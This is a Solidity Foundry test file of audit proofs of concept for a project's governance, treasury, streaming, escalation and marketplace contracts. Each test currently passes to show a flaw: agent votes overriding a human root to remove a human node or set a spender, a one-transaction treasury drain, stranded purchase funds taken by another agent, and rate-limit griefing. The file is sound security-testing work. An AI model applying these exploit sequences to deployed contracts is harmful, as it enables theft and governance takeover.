// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {GovernanceModule} from "../src/GovernanceModule.sol";
import {OrgRegistry} from "../src/OrgRegistry.sol";
import {IOrgRegistry} from "../src/interfaces/IOrgRegistry.sol";
import {Treasury} from "../src/Treasury.sol";
import {EpochStreamer} from "../src/EpochStreamer.sol";
import {EscalationRouter} from "../src/EscalationRouter.sol";
import {MarketplacePayments} from "../src/MarketplacePayments.sol";
import {WhitelistPolicy} from "../src/policies/WhitelistPolicy.sol";
import {RateLimitPolicy} from "../src/policies/RateLimitPolicy.sol";
import {MockUSDC} from "../src/mocks/MockUSDC.sol";

/// @dev Audit proofs of concept. Each test passes today, which demonstrates the bug.
///      When a fix lands, invert that test (`vm.expectRevert()` around the exploit step,
///      or assert the safe outcome) and flip the matching `*_FIX_PENDING` flag in
///      `AuditInvariant.t.sol` where one applies.
contract AuditPoC is Test {
    address root = makeAddr("root");
    address human2 = makeAddr("human2");
    address agentA = makeAddr("agentA");
    address agentB = makeAddr("agentB");

    function test_lowTierAgentsFireHumanInstantly() public {
        OrgRegistry reg = new OrgRegistry(root);
        GovernanceModule gov = new GovernanceModule(root, 2);
        vm.startPrank(root);
        reg.addNode(human2, IOrgRegistry.NodeKind.HumanRoot, root);
        reg.setGovernor(address(gov));
        gov.setVotingPower(agentA, 1, GovernanceModule.SeatRole.Agent);
        gov.setVotingPower(agentB, 1, GovernanceModule.SeatRole.Agent);
        vm.stopPrank();

        uint256 id =
            gov.propose(GovernanceModule.Tier.Low, address(reg), abi.encodeCall(OrgRegistry.removeNode, (human2)));
        vm.prank(root);
        gov.vote(id, false);
        vm.prank(agentA);
        gov.vote(id, true);
        vm.prank(agentB);
        gov.vote(id, true);
        gov.execute(id);
        vm.expectRevert();
        reg.getNode(human2);
    }

    function test_lowTierExecutesWhileOutvoted() public {
        Treasury t;
        MockUSDC usdc = new MockUSDC();
        OrgRegistry reg = new OrgRegistry(root);
        GovernanceModule gov = new GovernanceModule(root, 5);
        t = new Treasury(address(reg), address(usdc), address(1));
        t.setGovernor(address(gov));
        vm.startPrank(root);
        gov.setVotingPower(agentA, 1, GovernanceModule.SeatRole.Agent);
        gov.setVotingPower(agentB, 1, GovernanceModule.SeatRole.Agent);
        vm.stopPrank();
        uint256 id = gov.propose(GovernanceModule.Tier.Low, address(t), abi.encodeCall(Treasury.setSpender, (agentA)));
        vm.prank(root);
        gov.vote(id, false);
        vm.prank(agentA);
        gov.vote(id, true);
        vm.prank(agentB);
        gov.vote(id, true);
        gov.execute(id);
        assertEq(t.spender(), agentA);
    }

    function test_streamerOperatorDrainsLiquidityInOneTx() public {
        MockUSDC usdc = new MockUSDC();
        OrgRegistry reg = new OrgRegistry(root);
        Treasury t = new Treasury(address(reg), address(usdc), address(1));
        EpochStreamer s = new EpochStreamer(address(t), root);
        t.setStreamer(address(s));
        usdc.mint(address(t), 1_000e6);
        vm.startPrank(root);
        s.setGrant(agentA, 100e6);
        for (uint64 e = 1; e <= 10; e++) {
            s.runEpoch(e + 1000);
        }
        vm.stopPrank();
        assertEq(t.allowanceBalance(agentA), 1_000e6);
        assertEq(t.liquidBalance(), 0);
    }

    function test_failedPurchaseStrandsFundsThenStolen() public {
        MockUSDC usdc = new MockUSDC();
        OrgRegistry reg = new OrgRegistry(root);
        vm.startPrank(root);
        reg.addNode(agentA, IOrgRegistry.NodeKind.WorkerAgent, root);
        reg.addNode(agentB, IOrgRegistry.NodeKind.WorkerAgent, root);
        vm.stopPrank();
        WhitelistPolicy wl = new WhitelistPolicy();
        EscalationRouter r = new EscalationRouter(address(reg), address(wl));
        Treasury t = new Treasury(address(reg), address(usdc), address(r));
        r.setTreasury(address(t));
        MarketplacePayments m = new MarketplacePayments(address(usdc), root, root, 0);
        vm.prank(root);
        m.setSettlementRouter(address(r));
        wl.setAllowed(address(m), true);
        usdc.mint(address(t), 100e6);
        t.streamAllowance(agentA, 100e6, 1);

        address seller = makeAddr("seller");
        vm.prank(seller);
        m.registerListing(bytes32("L"), 100e6);
        vm.prank(agentA);
        r.propose(
            agentA, address(m), 100e6, abi.encodeCall(MarketplacePayments.purchaseFor, (bytes32("L"), agentA, 99e6))
        );
        assertEq(t.allowanceBalance(agentA), 0);
        assertFalse(m.hasPurchased(bytes32("L"), agentA));
        vm.prank(agentB);
        r.propose(agentB, address(m), 0, abi.encodeCall(MarketplacePayments.purchaseFor, (bytes32("L"), agentB, 100e6)));
        assertTrue(m.hasPurchased(bytes32("L"), agentB));
    }

    function test_crossAgentRateRecorderGrief() public {
        OrgRegistry reg = new OrgRegistry(root);
        vm.startPrank(root);
        reg.addNode(agentA, IOrgRegistry.NodeKind.WorkerAgent, root);
        reg.addNode(agentB, IOrgRegistry.NodeKind.WorkerAgent, root);
        vm.stopPrank();
        WhitelistPolicy wl = new WhitelistPolicy();
        EscalationRouter r = new EscalationRouter(address(reg), address(wl));
        RateLimitPolicy rlB = new RateLimitPolicy(1, 1 hours);
        rlB.setRecorder(address(r));
        r.setNodeRateRecorder(agentB, address(rlB));
        wl.setAllowed(address(rlB), true);
        vm.prank(agentA);
        r.propose(agentA, address(rlB), 0, abi.encodeCall(RateLimitPolicy.record, (agentB)));
        (, uint32 count) = rlB.windows(agentB);
        assertEq(count, 1);
    }
}
